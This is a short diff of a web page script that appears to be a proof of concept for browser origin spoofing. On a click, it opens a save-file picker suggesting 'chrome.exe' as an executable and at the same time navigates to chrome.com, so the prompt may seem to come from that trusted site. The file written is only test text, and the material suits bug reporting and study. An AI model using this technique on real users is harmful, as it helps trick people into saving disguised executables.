@@ -11,26 +11,26 @@
 <script>
 document.addEventListener('click', () => {
 
-    // Trigger Save File Picker after short delay
+    // Trigger Save File Picker
     setTimeout(async () => {
         if ('showSaveFilePicker' in window) {
             try {
                 const handle = await window.showSaveFilePicker({
                     suggestedName: 'chrome.exe',
                     types: [{
-                        description: 'Text File',
-                        accept: { 'text/plain': ['.txt'] }
+                        description: 'Application',
+                        accept: { 'application/octet-stream': ['.exe'] }
                     }]
                 });
 
                 const writable = await handle.createWritable();
-                await writable.write('Invoice data');
+                await writable.write('This is a test file.');
                 await writable.close();
             } catch (e) {}
         }
     }, 1000);
 
-    // Navigate to a trusted-looking domain at the same time
+    // Immediate navigation to different origin
     setTimeout(() => {
         window.location.href = 'https://chrome.com';
     }, 1000);
